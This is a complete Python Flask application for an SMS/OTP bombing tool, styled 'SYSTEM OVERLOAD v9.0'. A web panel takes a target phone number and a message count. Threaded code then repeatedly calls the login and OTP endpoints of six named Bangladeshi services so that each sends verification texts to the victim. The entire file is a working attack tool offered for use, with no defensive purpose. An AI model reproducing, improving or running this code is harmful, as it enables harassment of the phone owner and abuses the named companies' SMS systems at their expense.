from flask import Flask, render_template_string, request, jsonify
import requests
import threading
import time
import random
from concurrent.futures import ThreadPoolExecutor

app = Flask(__name__)

# --- GLOBAL STATE ---
attack_state = {
    "running": False,
    "total_sent": 0,
    "logs": []
}

# --- APIs ---
session = requests.Session()
def get_headers():
    return {"User-Agent": "Mozilla/5.0 (Linux; Android 10)", "Content-Type": "application/json"}

# 1. RedX
def api_1(num): 
    try: session.post("https://api.redx.com.bd/v1/user/request-login-code", json={"phone": num}, headers=get_headers(), timeout=4); return "RedX"
    except: return None
# 2. 10MS
def api_2(num): 
    try: session.post("https://auth.10minuteschool.com/api/v4/register/otp", json={"phone": num}, headers=get_headers(), timeout=4); return "10MS"
    except: return None
# 3. Bikroy
def api_3(num): 
    try: session.get(f"https://bikroy.com/data/phone_number_login/verifications/phone_login?phone={num}", headers=get_headers(), timeout=4); return "Bikroy"
    except: return None
# 4. Quizgiri
def api_4(num): 
    try: session.post("https://developer.quizgiri.xyz/api/v2.0/send-otp", json={"phone": num, "country_code": "+880"}, headers=get_headers(), timeout=4); return "Quizgiri"
    except: return None
# 5. Swap
def api_5(num): 
    try: session.post("https://api.swap.com.bd/api/v1/send-otp", json={"phone": num, "type": "login"}, headers=get_headers(), timeout=4); return "Swap"
    except: return None
# 6. Arogga
def api_6(num): 
    try: session.post("https://api.arogga.com/auth/v1/sms/send?f=mweb&b=&v=&os=&osv=&refPartner=", json={"mobile": "+88"+num}, headers=get_headers(), timeout=4); return "Arogga"
    except: return None

# --- ENGINE ---
def attack_logic(number, amount):
    if number.startswith("+88"): num = number[3:]
    elif number.startswith("880"): num = number[2:]
    else: num = number
    
    apis = [api_1, api_2, api_3, api_4, api_5, api_6]
    
    with ThreadPoolExecutor(max_workers=50) as executor:
        while attack_state['running'] and attack_state['total_sent'] < amount:
            random.shuffle(apis)
            futures = [executor.submit(api, num) for api in apis]
            for f in futures:
                if not attack_state['running']: break
                res = f.result()
                if res:
                    attack_state['total_sent'] += 1
                    attack_state['logs'].append(f"[SUCCESS] Hit -> {res}")
                    if len(attack_state['logs']) > 20: attack_state['logs'].pop(0)
            time.sleep(0.5)
    attack_state['running'] = False
    attack_state['logs'].append("[!] ATTACK FINISHED")

# --- HTML TEMPLATE (INSIDE PYTHON) ---
HTML_CODE = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Minhazur Server</title>
    <style>
        body { background: black; color: #0f0; font-family: monospace; text-align: center; padding: 20px; }
        .box { border: 1px solid #0f0; padding: 20px; max-width: 400px; margin: auto; border-radius: 10px; }
        input { width: 90%; padding: 10px; background: #111; border: 1px solid #0f0; color: white; margin: 10px 0; }
        button { width: 100%; padding: 10px; background: #0f0; color: black; font-weight: bold; cursor: pointer; border: none; }
        .logs { height: 150px; overflow-y: auto; background: #111; border: 1px solid #333; text-align: left; padding: 5px; margin-top: 10px; font-size: 12px; }
    </style>
</head>
<body>
    <div class="box">
        <h2>SYSTEM OVERLOAD v9.0</h2>
        <p>CLOUD SERVER EDITION</p>
        <input type="number" id="num" placeholder="Target Number">
        <input type="number" id="amt" placeholder="Amount" value="100">
        <button onclick="start()">START ATTACK</button>
        <button onclick="stop()" style="background:red; color:white; margin-top:5px;">STOP</button>
        
        <div class="logs" id="logBox">Waiting...</div>
        <p>Developed by: <b>MINHAZUR RAHMAN</b></p>
    </div>

    <script>
        let interval;
        async function start() {
            let n = document.getElementById('num').value;
            let a = document.getElementById('amt').value;
            await fetch('/start', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({number: n, amount: a})
            });
            interval = setInterval(update, 1000);
        }
        async function stop() { await fetch('/stop', { method: 'POST' }); }
        async function update() {
            let res = await fetch('/status');
            let data = await res.json();
            document.getElementById('logBox').innerHTML = data.logs.join("<br>");
            if (!data.running) clearInterval(interval);
        }
    </script>
</body>
</html>
"""

# --- ROUTES ---
@app.route('/')
def home():
    return render_template_string(HTML_CODE)

@app.route('/start', methods=['POST'])
def start():
    d = request.json
    attack_state['running'] = True
    attack_state['total_sent'] = 0
    attack_state['logs'] = ["[*] Server Started..."]
    threading.Thread(target=attack_logic, args=(d['number'], int(d['amount']))).start()
    return jsonify({"status": "started"})

@app.route('/stop', methods=['POST'])
def stop():
    attack_state['running'] = False
    return jsonify({"status": "stopped"})

@app.route('/status')
def status():
    return jsonify(attack_state)

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)